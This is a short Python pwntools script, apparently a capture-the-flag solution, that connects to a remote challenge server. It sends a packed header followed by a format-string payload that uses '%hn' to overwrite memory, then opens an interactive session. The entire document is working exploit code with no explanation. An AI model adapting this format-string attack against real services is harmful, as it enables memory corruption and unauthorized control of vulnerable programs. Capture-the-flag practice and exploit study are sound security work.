#!/usr/bin/env python3
from pwn import *

p = remote("nc.umbccd.net", 8929)

fmt = f"%{0x124e}c%9$hn".encode()
pl = p32(0x564D576E) + p32(len(fmt)) + p32(0) + fmt
p.send(pl)

p.interactive()